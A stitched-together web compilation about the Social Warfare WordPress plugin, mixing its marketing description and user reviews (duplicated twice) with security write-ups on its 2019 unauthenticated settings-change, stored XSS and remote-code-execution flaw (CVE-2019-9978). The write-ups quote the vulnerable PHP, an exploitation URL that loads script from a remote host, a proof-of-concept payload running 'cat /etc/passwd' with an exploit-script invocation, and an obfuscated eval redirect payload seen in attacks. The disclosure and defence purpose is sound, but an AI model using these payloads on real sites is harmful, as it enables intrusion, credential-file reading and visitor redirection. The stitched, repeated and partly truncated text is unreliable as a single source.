## Description

Get more social shares which can lead to more website traffic with the best WordPress social sharing plugin! Built by a group of social media marketing experts and world class developers who are obsessed with performance. Learn more at [Warfare Plugins](https://warfareplugins.com/?utm_medium=repository&utm_campaign=description&utm_source=wordpress_org&utm_content=repo_description).

#### WordPress Sharing Plugin

Most WordPress social sharing plugins slow down your site, are not attractive, and don’t work the way you would hope. Social Warfare share buttons are both lightning fast and beautiful.

Not only will it never slow down your website like other sharing plugins, we give you the most attractive share buttons available that look great no matter what screen size or resolution.

> Social Warfare has boosted social shares by **300%** without slowing down my blog.
>
> Eddie Gear – Professional Blogger

You can choose from the top social networks sharing buttons, including:

* Facebook
* Twitter
* Pinterest
* LinkedIn
* Mix

You can also choose where you want the share buttons to show up. Choose from the following placement options:

* Above the post content
* Below the post content
* Both above and below the post content
* None (or) Manual placement

We also give you the ability to have **floating share buttons** follow your readers down the screen when static (non-floating) buttons are not in view. This way the reader will always have easy access to your share buttons, no matter where they scroll on your page.

#### Popular Posts Widget based on Social Share Counts

Wouldn’t you love to show what your most popular posts are based on the number of social shares they’ve received? Social Warfare allows you to do just that.

You can even choose to display most your popular posts based on which social network they were popular on!

Social Warfare’s Popular Posts widget allows you to display and customize the look with:

* Post thumbnail images
* Image and text size
* Custom visual themes
* Custom date range

#### Click to Tweet Quotes

A simple and effective way to create tweetable quotes right inside your posts or pages. This has proven to increase the average number of tweets per article dramatically.

#### Use Shortcodes to Manually Place Social Share Buttons Anywhere

If you want to place buttons in the middle of an article, you can with our `[social_warfare]` shortcode.

What if you wanted to add share buttons to a page but actually have them share out a different page altogether (like being able to share your Subscribe page from your Thank You)? Social Warfare allows you to do this!

If you’re experienced with PHP, you can also hook Social Warfare into your theme templates for hyper customization.

#### Content Protection

We’ve built our highly demanded [Frame Buster](https://wordpress.org/plugins/frame-buster/) right into Social Warfare so that you are protected from content hijackers seeking to place their advertisements on top of your content without your permission.

> Social Warfare is by far the best social sharing plugin I’ve ever used. I recommend it to all of my clients.
>
> Andrew Wilder, Marketing Consultant

#### Premium Social Sharing Options

*Social Warfare – Pro* license holders also get access to the following social network share buttons:

* Reddit
* Tumblr
* Yummly
* WhatsApp
* Pocket
* Buffer
* Hacker News
* Flipboard
* Email

In addition to the extra social networks, you can also reactivate, track and display **Twitter tweet counts**!

#### Pin All the Images

Enabling the Image Hover Pin Button will place a “Pin” button over top of every image inside of your content when a reader hovers their mouse over it. This makes every image on your page highly sharable to Pinterest!

#### Powerful Share Customization

Social Warfare is among the pioneers of customizing how your content is shared, particularly with Pinterest. The *Social Warfare – Pro* add-on allows you to decide exactly which image, title and description appears when your content is shared on sites like Facebook and LinkedIn. This also applies to any other networks that use Open Graph data for social shares.

On top of that, you can upload a **custom Pinterest image** and write a custom description so that when someone clicks the pin button, the exact image you’ve chosen shows up with exactly the description you’ve written. No more hoping that your readers choose the best image and write an optimal description for you!

In addition to that, you can also write a custom tweet for when someone clicks on the Twitter button. The exact tweet you wrote will be displayed in the Twitter share box and Social Warfare will automatically add the link to your content and your @username to the end of it.

These capabilities are what professional social media marketers and bloggers have been waiting for.

#### Social Warfare – Pro Sharing Options, Custom Design and Placements

Customize which sharing networks you display, how your buttons look and where they show up.

You can choose from 6 different button shapes, 8 different color themes **plus** the ability to choose custom colors for your buttons. The design combinations are *unlimited*.

You will also get 6 different Click to Tweet styles and an option to create your own style via your theme’s CSS.

#### Minimum Social Proof

If you would prefer to only show counts after a certain minimum number of shares has been met (to avoid “negative social proof”), you can do that as well. Or if you’d rather just have no counts showing at all, just turn them off altogether.

#### Share Recovery: Your Lost Share Counts Returned!

Have you ever changed permalink structures, domain prefixes, connection protocols (http-https) or just flat out changed domains and ended up **losing all your social share counts?**

We’ve built a tool right into Social Warfare called [Share Recovery](https://warfareplugins.com/support/recover-social-share-counts-after-changing-permalink-settings/?utm_medium=repository&utm_campaign=description&utm_source=wordpress_org&utm_content=repo_description) which allows you to get back your lost share counts if you’ve ever had to modify your permalink settings.

#### Social Authorship, Twitter Cards, Rich Pins and More

It’s nice to have your stuff shared on social media, it’s even nicer when you get mentioned in the social share! With Social Warfare you can ensure that your authorship is always in place, including:

* Facebook author and publisher attribution
* Facebook app link (advanced users)
* Twitter publisher and author attribution
* “via @username” added to the ends of tweets
* “via @username” added to the ends of pin descriptions

You can also activate Twitter Cards (Large Image Cards) so that tweets sent from your site are always media rich and much more likely to get engagement.

Our plugin also ensures that your site is Rich Pin ready so that your Pins look as good as possible.

#### Link Shortening, Analytics Campaign and Button-click Tracking

Shorten shared links automatically using your own Bitly credentials so you can track how many clicks are occurring on your links.

Additionally, if you’re a Google Analytics user, you can set up Analytics tracking so that each shared link contains a networks specific UTM tracking code. This way you can track all inbound links that come as a direct result of Social Warfare shares.

You can also activate Event Tracking so that you can also see in Google Analytics exactly how many times your buttons are clicked.

It is without question that Social Warfare is the most powerful social sharing plugin available for WordPress. You get all these premium features while still benefitting from a super-fast, light-weight code base.

#### Third-Party Services

This plugin uses APIs from the following third-party services for sharing content. Please review their terms and privacy policies:

– Image URL (if specified)

Impact on User Data:

When using the Pinterest API, the URLs, descriptions, and images that users wish to share will be sent to Pinterest’s servers. Users should be aware that this data is transmitted to Pinterest, and they should review Pinterest’s privacy policy to understand how their data is handled.

I’ve been using Social Warfare without issue for a couple of years. Maybe a month ago I noticed that the option to upload social images for blog posts disappeared. I hadn’t added any new plugins or changed themes – I just kept current with updating the existing ones – so I contacted support.
I was told that it must be a conflict with my theme or a plugin, and their solution was to have me use a different theme (note I use a well-constructed theme built on Elementor Pro). Seriously?!
I did deactivate all non-essential plugins, but that didn’t solve the issue either.
Then I noticed that this plugin hasn’t been updated for the latest version of Wordpress. Hmmmm…
I got this plugin specifically to hide Pinterest images, so I’ll be cancelling.

You’ll be shooting in the dark just never knowing who is social sharing your posts/articles as the analytics don’t work; author knows this too. You’ll have no idea if users are sharing… yeah, just not worth it…

I have used Social Warfare for over 2 years. The support HAS NEVER been useful or helpful. I gave up on publishing the counts because it was too time consuming to send several emails to support; support only stalled if they replied at all. I am cancelling Social Warfare because they provide negative value.

This plugin might work a treat with smaller sites but was the biggest issue on a client’s site.
In SWP’s defence this site has 16k+ posts and 1000+ visits per day.
This information is from New Relic Application Performance Monitor.
12s of server use in one hour, just under Woocommerce and more than Yoast.
31.53% of all database calls.

# Full Disclosure of Settings Change/Persistent Cross-Site Scripting (XSS) Vulnerability in Social Warfare

With [our proactive monitoring of changes made to WordPress plugins in the Plugin Directory to try to catch serious vulnerabilities](https://www.pluginvulnerabilities.com/proactive-monitoring-for-vulnerabilities-in-new-versions-of-wordpress-plugins/) we review a lot of code that ends up not being vulnerable, so even if the flagged code looks rather concerning it doesn’t raise a lot of concern at first for us even, if like the code flagged in the plugin [Social Warfare](https://wordpress.org/plugins/social-warfare/), which we will get to in a moment, indicates there might be a very serious vulnerability. When we checked over the rest code related to the flagged code with that plugin we found that the plugin allows anyone to change the plugin’s settings and that could be used to cause persistent cross-site scripting (XSS), which is just the sort of vulnerability hackers have shown a lot of interest in recently. The plugin has 70,000+ active installations according to wordpress.org, which makes it all the more likely that would be exploited.

Our [Plugin Security Checker](https://www.pluginvulnerabilities.com/plugin-security-checker/) flags the same code as possibly being vulnerable, though it gets flagged by that for a less serious issue, server-side request forgery (SSRF).

Due to the moderators of the WordPress Support Forum’s [continued](https://www.pluginvulnerabilities.com/2018/09/27/wordpress-team-didnt-notify-developer-of-plugin-with-700000-active-installations-about-vulnerability-they-knew-about/) [inappropriate](https://www.pluginvulnerabilities.com/2018/09/25/wordpress-support-forum-moderators-engaged-in-cover-up-of-security-issues-in-wordpress-plugins/)[behavior](https://www.pluginvulnerabilities.com/2018/09/25/wordpress-support-forum-moderators-stop-people-from-getting-help-so-they-can-promote-favored-security-companies/) we are [full disclosing vulnerabilities in protest until WordPress gets that situation cleaned up](https://www.pluginvulnerabilities.com/2018/09/25/our-new-disclosure-policy-in-response-to-the-continued-inappropriate-behavior-of-the-wordpress-support-forum-moderators/), so we are releasing this post and then only trying to notify the developer through the WordPress Support Forum. You can notify the developer of this issue on the forum as well. Hopefully the moderators will finally see the light and clean up their act soon, so these full disclosures will no longer be needed (we hope they end soon). You would think they would have already done that since a [previously full disclosed vulnerability](https://www.pluginvulnerabilities.com/2018/11/12/full-disclosure-of-option-update-vulnerability-in-wordpress-plugin-with-30000-installs/)was [quickly on hackers’ radar](https://www.pluginvulnerabilities.com/2018/11/30/hackers-have-been-probing-for-usage-of-the-kiwi-social-share-wordpress-plugin-for-a-couple-of-weeks/), but it appears those moderators have such disdain for the rest of the WordPress community that their continued ability to act inappropriate is more important that what is best for the rest of the community.

## Details

The line of code flagged is the following:

| ``` 231  ``` | ``` $options = file_get_contents($_GET['swp_url'] . '?swp_debug=get_user_options'); ``` |
| --- | --- |

$options = file\_get\_contents($\_GET['swp\_url'] . '?swp\_debug=get\_user\_options');

That will take contents of a file on the website or another website, which is specified by user input, the GET input “swp\_url”, and sets it to the variable $options. Based on the name of the variable that could indicate that arbitrary user input from a remote location might be able to be set as the plugin’s options (settings), which in the worst case could lead to the type of vulnerability being [exploited this week in Easy WP SMTP](https://www.pluginvulnerabilities.com/2019/03/19/other-wordpress-plugin-vulnerability-data-sources-still-not-warning-about-fixed-or-unfixed-vulnerabilities-in-easy-wp-smtp/).

The worst case though could be ruled out right away, because while that code is used to update the plugin’s settings, the code at least restrict what WordPress option can be updated:

| ``` 275  ``` | ``` if (update_option( 'social_warfare_settings', $new_options )) { ``` |
| --- | --- |

if (update\_option( 'social\_warfare\_settings', $new\_options )) {

There is a bit of code between those two lines that if you want to see, you can find in the function debug\_parameters() in the file /social-warfare/lib/utilities/SWP\_Database\_Migration.php.

Whether there is a vulnerability there would depend on who and how some can access that code. Things start off looking bad when the code checks if [is\_admin()](https://developer.wordpress.org/reference/functions/is_admin/), which doesn’t indicate if someone is Administrator, but if they are accessing an admin page, which even those not logged in can do (why the WordPress developer haven’t done something about that misleading function despite the problem with it [being warned about](https://core.trac.wordpress.org/ticket/16490) before it was introduced in the production version of WordPress over 8 years ago is beyond us):

| ``` 226 227 228 229  ``` | ``` if ( true == SWP_Utility::debug('load_options') ) { 	if (!is_admin()) { 		wp_die('You do not have authorization to view this page.'); 	} ``` |
| --- | --- |

if ( true == SWP\_Utility::debug('load\_options') ) {
if (!is\_admin()) {
wp\_die('You do not have authorization to view this page.');
}

That other check just checks if the GET input “swp\_debug” is set to “load\_options”:

| ``` 275 276 277  ``` | ``` public static function debug( $key = '' ) { 	return !empty( $_GET['swp_debug'] ) && ( strtolower( $_GET['swp_debug'] ) == strtolower( $key ) ); } ``` |
| --- | --- |

public static function debug( $key = '' ) {
return !empty( $\_GET['swp\_debug'] ) && ( strtolower( $\_GET['swp\_debug'] ) == strtolower( $key ) );
}

The function debug\_parameters() the previous code is in will run when a function named init() is run:

| ``` 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69  ``` | ``` public function init() {   	// Check for and migrate the settings page data. 	if ( !$this->database_is_migrated() ) { 		$this->migrate(); 	}   	// Initialize the database for new installs. 	if ( !$this->has_3_0_0_settings() ) { 		$this->initialize_database(); 	}   	// Check for and migrate the post meta fields. 	if ( !$this->post_meta_is_migrated() ) { 		$this->update_post_meta(); 		$this->update_hidden_post_meta(); 		$this->update_last_migrated(); 	}   	$this->debug_parameters(); ``` |
| --- | --- |

public function init() {
// Check for and migrate the settings page data.
if ( !$this->database\_is\_migrated() ) {
$this->migrate();
}
// Initialize the database for new installs.
if ( !$this->has\_3\_0\_0\_settings() ) {
$this->initialize\_database();
}
// Check for and migrate the post meta fields.
if ( !$this->post\_meta\_is\_migrated() ) {
$this->update\_post\_meta();
$this->update\_hidden\_post\_meta();
$this->update\_last\_migrated();
}
$this->debug\_parameters();

You would think that means that it runs during [init](https://developer.wordpress.org/reference/hooks/init/), but it turns out it runs during [plugins\_loaded](https://developer.wordpress.org/reference/hooks/plugins_loaded/):

| ``` 38  ``` | ``` add_action( 'plugins_loaded', array( $this, 'init' ), 100 ); ``` |
| --- | --- |

add\_action( 'plugins\_loaded', array( $this, 'init' ), 100 );

The result is the same, anyone can change the plugin’s settings.

As the proof of concept, shown below, we quickly threw together shows (so hackers would have no problem doing that if we hadn’t provided that), you can abuse that to cause malicious JavaScript code to be placed on the plugin’s admin page and frontend pages of the website, which is persistent cross-site scripting (XSS).

SSRF comes in to play as the original line of code we showed allows making request to arbitrary URLs.

The other code in the function debug\_parameters() allows anyone to do other things like export the plugin’s settings.

## Proof of Concept

The following proof of concept will cause any available cookies to be shown on the plugin’s admin page and frontend pages where the plugin functionality is shown.

**Exploit availability:**
[Yes](https://www.cybersecurity-help.cz/exploits/18052/?ref=bulletin)

**Description**

The vulnerability allows a remote attacker to perform cross-site scripting attacks.

The vulnerability exists due to usage of the eval() JavaScript call on data passed via the  "swp\_url" HTTP GET parameter to "/wp-admin/admin-post.php" script, when "swp\_debug" is set to "load\_options", allowing to permanently inject and execute arbitrary JavaScript code on the website. A remote unauthenticated attacker can store a specially crafted JavaScript code into database and execute it in browser of every website visitor.

Note: this vulnerability is being actively exploited in the wild.

Exploitation example:

```
http://[host]/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://[malicious_js_script]/
```

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# CVE-2019-9978

CVE-2019-9978 - (PoC) RCE in Social WarFare Plugin (<=3.5.2)

## Description

Unauthenticated remote code execution has been discovered in functionality that handles settings import. A user can leverage the use of RFI to RCE.

## PoC

Copy the following payload:

```
<pre>system('cat /etc/passwd')</pre>

```

Save it with filename: `payload.txt` and upload it on a server. The URI should look like: `http(s)://yoursite.com/payload.txt`. Finally, supply your `--target` and `--payload-uri` options:

```
$ python cve-2019-9978.py --target http://vulntarget.com \
                         --payload-uri http://yourpayloadsite.com/payload.txt

```

The plugin is vulnerable to a Stored XSS (Cross-Site Scripting) vulnerability and has been removed from the plugin repository. Attacks can be conducted by any users visiting the site.

A patch has been released and users are advised to update to **version 3.5.3** as soon as possible.

## What Is It All About?

The vulnerable code is contained within some of the plugins debugging features. These features aren’t directly used anywhere and rely on various **$\_GET** parameters to be executed, which makes it easy to see if your site was attacked using this vulnerability.

A fully working PoC is available in the wild and we expect the number of exploit attempts to grow in size in the coming days.

### Indicators of Compromise:

You can look for requests pointing to **any PHP file /wp-admin/** with the following parameters in your access logs:

* **swp\_debug**
* **swp\_url**

## Exploits in the wild

We are seeing a lot of exploit attempts in the wild from more than a hundred different IPs.

```
202.254.236.49 - - [21/Mar/2019:16:52:14 -0400] "GET /wp-admin/admin-post.php?swp_debug=load_options&swp_url=https://pastebin.com/raw/0yJzqbYf HTTP/1.1" 403 2669 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0"
```

*Sample Exploitation Attempt*

The attackers are injecting rogue javascript scripts by loading the following url <https://pastebin.com/raw/0yJzqbYf>, which contains this malicious payload:

```
'twitter_id' => '"><script language=javascript>eval(String .fromCharCode(118, 97, 114, 32, 108, 108, 116, 32, 61, 32, 34, 104, 116, 116, 112, 115, 58, 47, 47, 115, 101, 116, 102, 111, 114, 99, 111, 110, 102, 105, 103, 112, 108, 101, 97, 115, 101, 46, 99, 111, 109, 47, 119, 101, ...skipped... 110, 46, 104, 114, 101, 102, 61, 108, 108, 116, 32, 59, 119, 105, 110, 100, 111, 119, 46, 108, 111, 99, 97, 116, 105, 111, 110, 46, 104, 114, 101, 102, 61, 108, 108, 116, 59));</script>',
```

*Sample payload used by the attackers*

This script redirects the user to another malicious site.

## **In Conclusion**

Cross-site scripting (XSS) is a widespread vulnerability that allows an attacker to inject malicious content into a site. This forces a victim’s browser to execute code as the page is loaded and perform actions in the browser on behalf of the website.

In the case of Stored XSS as seen with the Social Warfare vulnerability, the payload gets stored in the site’s database and retrieved with every page request. If left unpatched, it can be very dangerous, as it gives an attacker almost complete control of the browser environment.

Unauthenticated attacks are very serious because they can be automated — this makes it easy for hackers to mount successful, widespread attacks against vulnerable websites. The number of active installs, the ease of exploitation, and the effects of a successful attack are what makes this vulnerability particularly dangerous.

To protect against this vulnerability, we strongly encourage Social Warfare users to update their plugin to **version 3.5.3** as soon as possible. In the event that you can’t update right away, you can leverage the [Sucuri Firewall](http://sucuri.net/website-firewall/stop-website-attacks-and-hacks) or equivalent technology to virtually patch the vulnerability.

# Unpatched Zero-Day Vulnerability in Social Warfare Plugin Exploited In The Wild

Earlier today, an unnamed security researcher published a full disclosure of a stored Cross-Site Scripting (XSS) vulnerability present in the most recent version of popular WordPress plugin Social Warfare. The plugin, which was subsequently removed from the WordPress.org plugin repository, has an active install base of over 70,000 sites. The flaw allows attackers to inject malicious JavaScript code into the social share links present on a site’s posts.

The Defiant Threat Intelligence team has already identified attacks against this vulnerability, and has deployed a firewall rule to prevent its exploitation. Premium users gain immediate access to the new rule, and after a thirty-day delay it will be available to Free users. Because this vulnerability has yet to be patched, it is recommended that site administrators deactivate the plugin until a patch is released.

At this time, we are refraining from publicizing details of the flaw and the attacks against it. At such time that the vendor makes a patch available, we will produce a follow-up post with further information.

## What Should I Do?

If your site is protected by Wordfence Premium, your firewall will have a new rule designed to prevent these attacks. If not, you can gain access to the rule by [upgrading to Premium](https://www.wordfence.com/wordfence-signup/) now. Short of that, deactivating the Social Warfare plugin until a patch is available will prevent these attacks, though at the loss of the plugin’s functionality.

Our team is actively tracking attacks against this flaw, and will produce more details as soon as we feel is responsible. In the meantime, please consider sharing this public service announcement to other WordPress users who may not know of these new risk factors.

  Our entire development team is currently working to issue a patch and hope to have it released within the hour, but in the meantime we recommend disabling Social Warfare and Social Warfare Pro on your website.

  This patch, once available will be listed as version 3.5.3 and you will be able to download and apply the update even while Social Warfare and Social Warfare Pro are disabled.

  For up to the minute updates on this issue you can view our support page at https://warfareplugins.com/submit-ticket/ or our Twitter at https://twitter.com/warfareplugins .

  We found out about this just over 2 hours ago and started working frantically on a solution. We have now patched both the vulnerability and have made it so that any affected sites will be automatically fixed immediately upon installing 3.5.3. We just published this version about 10 minutes ago that will immediately fix this issue. It won’t be available until WordPress reviews the new version and reactivates the plugin.

  In the mean time, you can get the fixed version directly from our website here:

  We are super upset and distressed about this, as I’m sure you can all imagine. Hackers suck and it’s horrible that we live in a world where people do this. But at the end of the day, it was still our fault for having the vulnerability for them to be able to take advantage of. We’re more sorry about this whole ordeal than any of you could possibly imagine, and we’re thankful for a lot of the support and wonderful kindness that the vast majority of you have sent our way during this.

  It's frustrating that Social Warefare didn't send out a notification about this, leaving site owners to guess at what was wrong. I had to search "Social Warefare Hacked" in order to even get the latest information about it...

## Description

Get more social shares which can lead to more website traffic with the best WordPress social sharing plugin! Built by a group of social media marketing experts and world class developers who are obsessed with performance. Learn more at [Warfare Plugins](https://warfareplugins.com/?utm_medium=repository&utm_campaign=description&utm_source=wordpress_org&utm_content=repo_description).

#### WordPress Sharing Plugin

Most WordPress social sharing plugins slow down your site, are not attractive, and don’t work the way you would hope. Social Warfare share buttons are both lightning fast and beautiful.

Not only will it never slow down your website like other sharing plugins, we give you the most attractive share buttons available that look great no matter what screen size or resolution.

> Social Warfare has boosted social shares by **300%** without slowing down my blog.
>
> Eddie Gear – Professional Blogger

You can choose from the top social networks sharing buttons, including:

* Facebook
* Twitter
* Pinterest
* LinkedIn
* Mix

You can also choose where you want the share buttons to show up. Choose from the following placement options:

* Above the post content
* Below the post content
* Both above and below the post content
* None (or) Manual placement

We also give you the ability to have **floating share buttons** follow your readers down the screen when static (non-floating) buttons are not in view. This way the reader will always have easy access to your share buttons, no matter where they scroll on your page.

#### Popular Posts Widget based on Social Share Counts

Wouldn’t you love to show what your most popular posts are based on the number of social shares they’ve received? Social Warfare allows you to do just that.

You can even choose to display most your popular posts based on which social network they were popular on!

Social Warfare’s Popular Posts widget allows you to display and customize the look with:

* Post thumbnail images
* Image and text size
* Custom visual themes
* Custom date range

#### Click to Tweet Quotes

A simple and effective way to create tweetable quotes right inside your posts or pages. This has proven to increase the average number of tweets per article dramatically.

#### Use Shortcodes to Manually Place Social Share Buttons Anywhere

If you want to place buttons in the middle of an article, you can with our `[social_warfare]` shortcode.

What if you wanted to add share buttons to a page but actually have them share out a different page altogether (like being able to share your Subscribe page from your Thank You)? Social Warfare allows you to do this!

If you’re experienced with PHP, you can also hook Social Warfare into your theme templates for hyper customization.

#### Content Protection

We’ve built our highly demanded [Frame Buster](https://wordpress.org/plugins/frame-buster/) right into Social Warfare so that you are protected from content hijackers seeking to place their advertisements on top of your content without your permission.

> Social Warfare is by far the best social sharing plugin I’ve ever used. I recommend it to all of my clients.
>
> Andrew Wilder, Marketing Consultant

#### Premium Social Sharing Options

*Social Warfare – Pro* license holders also get access to the following social network share buttons:

* Reddit
* Tumblr
* Yummly
* WhatsApp
* Pocket
* Buffer
* Hacker News
* Flipboard
* Email

In addition to the extra social networks, you can also reactivate, track and display **Twitter tweet counts**!

#### Pin All the Images

Enabling the Image Hover Pin Button will place a “Pin” button over top of every image inside of your content when a reader hovers their mouse over it. This makes every image on your page highly sharable to Pinterest!

#### Powerful Share Customization

Social Warfare is among the pioneers of customizing how your content is shared, particularly with Pinterest. The *Social Warfare – Pro* add-on allows you to decide exactly which image, title and description appears when your content is shared on sites like Facebook and LinkedIn. This also applies to any other networks that use Open Graph data for social shares.

On top of that, you can upload a **custom Pinterest image** and write a custom description so that when someone clicks the pin button, the exact image you’ve chosen shows up with exactly the description you’ve written. No more hoping that your readers choose the best image and write an optimal description for you!

In addition to that, you can also write a custom tweet for when someone clicks on the Twitter button. The exact tweet you wrote will be displayed in the Twitter share box and Social Warfare will automatically add the link to your content and your @username to the end of it.

These capabilities are what professional social media marketers and bloggers have been waiting for.

#### Social Warfare – Pro Sharing Options, Custom Design and Placements

Customize which sharing networks you display, how your buttons look and where they show up.

You can choose from 6 different button shapes, 8 different color themes **plus** the ability to choose custom colors for your buttons. The design combinations are *unlimited*.

You will also get 6 different Click to Tweet styles and an option to create your own style via your theme’s CSS.

#### Minimum Social Proof

If you would prefer to only show counts after a certain minimum number of shares has been met (to avoid “negative social proof”), you can do that as well. Or if you’d rather just have no counts showing at all, just turn them off altogether.

#### Share Recovery: Your Lost Share Counts Returned!

Have you ever changed permalink structures, domain prefixes, connection protocols (http-https) or just flat out changed domains and ended up **losing all your social share counts?**

We’ve built a tool right into Social Warfare called [Share Recovery](https://warfareplugins.com/support/recover-social-share-counts-after-changing-permalink-settings/?utm_medium=repository&utm_campaign=description&utm_source=wordpress_org&utm_content=repo_description) which allows you to get back your lost share counts if you’ve ever had to modify your permalink settings.

#### Social Authorship, Twitter Cards, Rich Pins and More

It’s nice to have your stuff shared on social media, it’s even nicer when you get mentioned in the social share! With Social Warfare you can ensure that your authorship is always in place, including:

* Facebook author and publisher attribution
* Facebook app link (advanced users)
* Twitter publisher and author attribution
* “via @username” added to the ends of tweets
* “via @username” added to the ends of pin descriptions

You can also activate Twitter Cards (Large Image Cards) so that tweets sent from your site are always media rich and much more likely to get engagement.

Our plugin also ensures that your site is Rich Pin ready so that your Pins look as good as possible.

#### Link Shortening, Analytics Campaign and Button-click Tracking

Shorten shared links automatically using your own Bitly credentials so you can track how many clicks are occurring on your links.

Additionally, if you’re a Google Analytics user, you can set up Analytics tracking so that each shared link contains a networks specific UTM tracking code. This way you can track all inbound links that come as a direct result of Social Warfare shares.

You can also activate Event Tracking so that you can also see in Google Analytics exactly how many times your buttons are clicked.

It is without question that Social Warfare is the most powerful social sharing plugin available for WordPress. You get all these premium features while still benefitting from a super-fast, light-weight code base.

#### Third-Party Services

This plugin uses APIs from the following third-party services for sharing content. Please review their terms and privacy policies:

Impact on User Data:

When using the Pinterest API, the URLs, descriptions, and images that users wish to share will be sent to Pinterest’s servers. Users should be aware that this data is transmitted to Pinterest, and they should review Pinterest’s privacy policy to understand how their data is handled.

I’ve been using Social Warfare without issue for a couple of years. Maybe a month ago I noticed that the option to upload social images for blog posts disappeared. I hadn’t added any new plugins or changed themes – I just kept current with updating the existing ones – so I contacted support.
I was told that it must be a conflict with my theme or a plugin, and their solution was to have me use a different theme (note I use a well-constructed theme built on Elementor Pro). Seriously?!
I did deactivate all non-essential plugins, but that didn’t solve the issue either.
Then I noticed that this plugin hasn’t been updated for the latest version of Wordpress. Hmmmm…
I got this plugin specifically to hide Pinterest images, so I’ll be cancelling.

You’ll be shooting in the dark just never knowing who is social sharing your posts/articles as the analytics don’t work; author knows this too. You’ll have no idea if users are sharing… yeah, just not worth it…

I have used Social Warfare for over 2 years. The support HAS NEVER been useful or helpful. I gave up on publishing the counts because it was too time consuming to send several emails to support; support only stalled if they replied at all. I am cancelling Social Warfare because they provide negative value.

This plugin might work a treat with smaller sites but was the biggest issue on a client’s site.
In SWP’s defence this site has 16k+ posts and 1000+ visits per day.
This information is from New Relic Application Performance Monitor.
12s of server use in one hour, just under Woocommerce and more than Yoast.
31.53% of all database calls.
